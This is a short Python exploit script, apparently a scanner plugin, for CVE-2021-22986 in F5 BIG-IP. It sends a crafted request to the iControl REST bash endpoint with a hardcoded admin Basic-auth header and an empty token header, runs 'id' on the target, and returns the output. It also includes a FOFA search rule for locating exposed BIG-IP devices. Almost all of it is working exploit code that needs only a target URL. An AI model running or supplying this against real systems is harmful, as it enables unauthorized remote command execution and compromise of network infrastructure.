#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import json
from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='CVE-2021-22986'
AUTHOR="Joker"
REMARK='F5 BIG-IP 远程代码执行漏洞2'
FOFA_RULE='title="BIG-IP&reg ;- Redirect"或icon_hash="-335242539"'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/mgmt/tm/util/bash" 
    headers = {
        "User-Agent": ua,
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
    data = '{"command":"run","utilCmdArgs":"-c id"}'
    try:
        r = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5,proxies=proxies)
        if "commandResult" in r.text and r.status_code == 200:
            c = json.loads(r.text)["commandResult"]
            result['target'] = target
            result['poc'] = NAME
            result['data'] = c
            return result
        else:
            pass
    except:
        pass


if __name__ == '__main__':
    poc("https://127.0.0.1/")